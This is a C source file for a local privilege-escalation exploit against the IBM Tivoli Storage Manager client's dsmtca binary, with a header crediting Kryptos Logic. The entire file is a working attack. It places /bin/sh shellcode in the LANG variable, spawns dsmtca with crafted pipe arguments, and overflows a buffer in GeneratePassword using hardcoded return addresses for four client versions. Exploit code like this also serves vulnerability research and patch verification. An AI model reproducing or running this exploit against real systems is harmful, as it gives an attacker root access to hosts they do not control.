/*
 * IBM Tivoli Storage Manager 6.1 - Local Root in DSMTCA GeneratePassword
 * Copyright (C) 2009-2010 Kryptos Logic
 *
 * Bug discovered by Peter Wilhelmsen and Daniel Kalici.
 * Exploit by Peter Wilhelmsen and Morten Shearman Kirkegaard.
 *
 */

#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <inttypes.h>

char shellcode[] =
  "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x1d"
  "\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3"
  "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
  "\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";

enum arguments {
	tcaProgramPath,
	tcaDebugStop,
	tcaAlertString,
	tcaPipe0,
	tcaPipe1,
	tcaPipe2,
	tcaPipe3,
	tcaPswdFileName,
	tcaLang,
	tcaErrorLog,
	tcaDsDir,
	tcaRequest,
	tcaSessID,
	tcaServerName,
	tcaPasswordFile,
	tcaPasswordDir,
	tcaBuildData,
	tcaBuildTime,
	tcaCliType,
	tcaTraceTrusted,
	tcaClusterEnabl,
	tcaCryptoType,
	tcaTerminate,
	tcaArgCount
};


struct {
	char *name;
	int buflen;
	uint32_t retaddr;
} versions[] = {
	{ "5.5.1.4-linux-i386", 40, 0x0826E7E0 },
	{ "5.5.2.0-linux-i386", 40, 0x08278180 },
	{ "6.1.0.0-linux-i386", 56, 0x08356520 },
	{ "6.1.3.0-linux-i386", 56, 0x083C7100 },
	{ NULL }
};



void SpawnTask(char *argv[])
{
	pid_t pid;

	signal(SIGCHLD, SIG_IGN);

	pid = fork();

	if (pid == -1) {
		perror("fork() failed");
		exit(EXIT_FAILURE);
	}

	if (pid != 0) {
		return;
	}

	signal(SIGINT, SIG_IGN);
	signal(SIGTERM, SIG_IGN);
	signal(SIGQUIT, SIG_IGN);
	signal(SIGPIPE, SIG_IGN);
	signal(SIGSEGV, SIG_IGN);
	signal(SIGXFSZ, SIG_IGN);
	signal(SIGTSTP, SIG_IGN);
	signal(SIGABRT, SIG_IGN);

	execv(argv[0], argv);
	perror("execv() failed");
	exit(EXIT_FAILURE);
}



void exploit(int v)
{
	int pfd[2];
	int cfd[2];
	char p0[16];
	char p1[16];
	char p2[16];
	char p3[16];
	char buffer[64];
	uint8_t len;
	char *args[tcaArgCount];

	len = versions[v].buflen + 8;
	if (len > sizeof(buffer)) {
		fprintf(stderr, "versions[%d].buflen > %d\n",
			v, (int)sizeof(buffer));
		exit(EXIT_FAILURE);
	}

	setenv("LANG", shellcode, strlen(shellcode));

	if((pipe(pfd) == -1) || (pipe(cfd) == -1))
	{
		perror("pipe() failed");
		exit(EXIT_FAILURE);
	}

	sprintf(p0, "%d", pfd[0]);
	sprintf(p1, "%d", pfd[1]);
	sprintf(p2, "%d", cfd[0]);
	sprintf(p3, "%d", cfd[1]);

	args[tcaProgramPath ] = "/opt/tivoli/tsm/client/ba/bin/dsmtca";
	args[tcaDebugStop   ] = "0";
	args[tcaAlertString ] = "TCA Interr\bfacee\b ADSM Release 3";
	args[tcaPipe0       ] = p0;
	args[tcaPipe1       ] = p1;
	args[tcaPipe2       ] = p2;
	args[tcaPipe3       ] = p3;
	args[tcaPswdFileName] = "/etc/adsm/TSM.PWD";
	args[tcaLang        ] = "/opt/tivoli/tsm/client/lang/en_US/dsmclientV3.cat";
	args[tcaErrorLog    ] = "/var/log/dsmerror.log";
	args[tcaDsDir       ] = "/opt/tivoli/tsm/client/ba/bin";
	args[tcaRequest     ] = "C";
	args[tcaSessID      ] = "NODE";
	args[tcaServerName  ] = "SERVER";
	args[tcaPasswordFile] = "/etc/adsm/TSM.PWD";
	args[tcaPasswordDir ] = "";
	args[tcaBuildData   ] = "AASATRG";
	args[tcaBuildTime   ] = "DMESEEG";
	args[tcaCliType     ] = "";
	args[tcaTraceTrusted] = "0";
	args[tcaClusterEnabl] = "0";
	args[tcaCryptoType  ] = "1";
	args[tcaTerminate   ] = (char *)NULL;

	SpawnTask(args);

	close(pfd[0]);
	close(cfd[1]);

	/* 0805A7BD	call	_read( fd, buf, 1 ) */
	write(pfd[1], "\x41", 1);

	/* 0805A7DD	call	_read( fd, var_AAA, 1 ) */
	write(pfd[1], "\x41", 1);

	/* 0805A7FD	call	_read( fd, var_5BB, 1 ) */
	write(pfd[1], &len, 1);

	/* 0805A824	call	_read( fd, var_28, var_5BB ) */
	memset(buffer, 'A', sizeof(buffer));
	*(uint32_t *)(buffer + len - 4) = versions[v].retaddr;
	write(pfd[1], buffer, len);

	/* read the response, needed to make GeneratePassword() return */
	read(cfd[0], buffer, sizeof(buffer));

	close(pfd[1]);
	close(cfd[0]);
}



void usage(char *path)
{
	int i;

	fprintf(stderr, "Usage: %s version\n", path);
	fprintf(stderr, "\n");
	fprintf(stderr, "Where \"version\" is one of:\n");
	for (i=0; versions[i].name; i++) {
		fprintf(stderr, "%s\n", versions[i].name);
	}
}



int main(int argc, char *argv[])
{
	int i;

	if (argc != 2) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	for (i=0; versions[i].name; i++) {
		if (strcmp(argv[1], versions[i].name) == 0) {
			exploit(i);
			return EXIT_SUCCESS;
		}
	}

	usage(argv[0]);
	return EXIT_FAILURE;
}

